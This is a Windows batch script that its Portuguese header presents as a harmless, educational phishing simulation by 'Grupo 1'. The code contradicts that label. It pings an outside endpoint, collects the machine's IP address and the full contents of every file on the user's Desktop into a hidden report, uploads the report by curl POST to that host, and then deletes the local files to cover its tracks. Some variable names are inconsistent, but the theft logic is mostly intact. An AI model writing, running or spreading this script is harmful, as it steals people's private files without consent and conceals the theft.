@echo off
REM --- Script de Simulacao de Phishing ---
REM Autor: Grupo 1
REM Este script e apenas para fins educacionais e e inofensivo.

setlocal enableextensions enabledelayedexpansion

:: Set the phishing's endpoint
set URLFC="https://api.myphishing.com/v2/"
:: Set the output file
set TMP_FILE=".txt" :: set the output file

:: Test if the endpoint is active
curl --request GET \
  --url %URLFC% \
  --output %TMP_FILE%

:: If the response was positive, the TMP_FILE was created
if exist "%TMP_FILE%" (
    :: --- Configuration ---
    set "OUTPUT_FILE=.PC_Report_%DATE:~-4,4%%DATE:~-7,2%%DATE:~-10,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%.txt"
    set "TARGET_FOLDER=%UserProfile%\Desktop"

    :: Create or clear the output file
    echo PC Report > "%OUTPUT_FILE%"
    echo Generated on %DATE% at %TIME% >> "%OUTPUT_FILE%"
    echo --------------------------------------- >> "%OUTPUT_FILE%"
    echo. >> "%OUTPUT_FILE%"

    :: --- Get IP Address ---
    echo --- IP Address --- >> "%OUTPUT_FILE%"
    for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "ipv4 address"') do (
        for /f "tokens=*" %%j in ("%%i") do (
            echo IPv4 Address: %%j >> "%OUTPUT_FILE%"
        )
    )
    echo. >> "%OUTPUT_FILE%"

    :: --- Get Name and Content of Each File in the TARGET_FOLDER ---
    echo --- Folder Content: %TARGET_FOLDER% --- >> "%OUTPUT_FILE%"

    :: Check if the target folder exists
    if exist "%TARGET_FOLDER%" (
        :: Loop through each file in the target folder
        for %%f in ("%TARGET_FOLDER%\*") do (
            echo. >> "%OUTPUT_FILE%"
            echo File Name: %%~nxf >> "%OUTPUT_FILE%"
            echo Full Path: %%~dpnxf >> "%OUTPUT_FILE%"
            echo File Size: %%~zf bytes >> "%OUTPUT_FILE%"
            echo Last Modified: %%~tf >> "%OUTPUT_FILE%"
            echo --------------------------------------- >> "%OUTPUT_FILE%"
            echo File Content: >> "%OUTPUT_FILE%"
            type "%%f" >> "%OUTPUT_FILE%"
            echo. >> "%OUTPUT_FILE%"
            echo --------------------------------------- >> "%OUTPUT_FILE%"
        )
    )

    curl --request POST \
    --url URLFC \
    -F file=@"%OUTPUT_FILE%"

    :: Clean up the temporary file
    del "%TEMP_FILE%"
    del "%OUTPUT_FILE%"
)

exit


